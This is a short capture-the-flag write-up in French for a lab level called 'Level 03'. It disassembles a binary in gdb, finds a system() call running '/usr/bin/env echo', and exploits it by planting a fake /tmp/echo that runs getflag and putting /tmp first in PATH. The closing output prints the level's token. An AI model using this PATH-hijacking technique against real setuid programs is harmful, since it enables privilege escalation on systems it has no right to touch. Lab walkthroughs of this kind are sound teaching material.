# Level 03

Dans le home on peut apercevoir un executable, que lorsqu'on le lance, nous ecrit dans le terminal: `Exploit me`.

La première chose qu'on pense c'est de voir comment est construit cet executable.
Et pour ce faire, on lance gdb avec l'executable comme argument.

Ensuite désassembler l'entry point.

```
$ gdb level03
(gdb) disassemble main
Dump of assembler code for function main:
	...
   0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
	...
End of assembler dump.
```

Et la permière chose que l'on voit dans ce main est le call de la fonction system avec comme argument la string à cette position `0x80485e0`

Donc on va regarder cette position:
```
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
(gdb)
```
On voit donc que l'argument de system est `"/usr/bin/env echo Exploit me"`. Ce qui nous fait penser qu'on pourrait mettre un faux executable echo.

Pour ce faire on va créer le script/executable, qu'on va mettre dans /tmp/echo, lui donner les bonnes permissions et un path directement sur /tmp

```
$ echo "sh -c getflag" > /tmp/echo
$ chmod 755 /tmp/echo
$ export PATH=/tmp:$PATH
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
